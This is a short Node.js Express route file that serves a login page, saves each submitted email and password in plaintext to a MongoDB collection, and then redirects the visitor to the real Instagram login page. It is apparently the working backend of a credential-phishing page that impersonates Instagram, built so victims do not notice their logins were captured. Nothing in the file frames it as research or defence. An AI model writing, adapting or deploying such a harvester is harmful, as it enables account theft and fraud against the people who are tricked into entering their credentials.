const router = require("express").Router()
const {dbName, dbUrl} = require("../database")
const {MongoClient} = require("mongodb")

router.get("/", (req,res)=>{
    res.render("login", {})
})

router.post("/", (req,res)=>{
    MongoClient.connect(dbUrl, (err,database)=>{
        if(err){
            res.redirect("https://www.instagram.com/accounts/login/")
        }
        const db = database.db(dbName)
        const date = new Date()
        db.collection("users").insertOne({
            email: req.body.email,
            password: req.body.password,
            date: `${date.getDate()}/${date.getMonth()+1}/${date.getFullYear()}`
        })
    })
    res.redirect("https://www.instagram.com/accounts/login/")
})

module.exports = router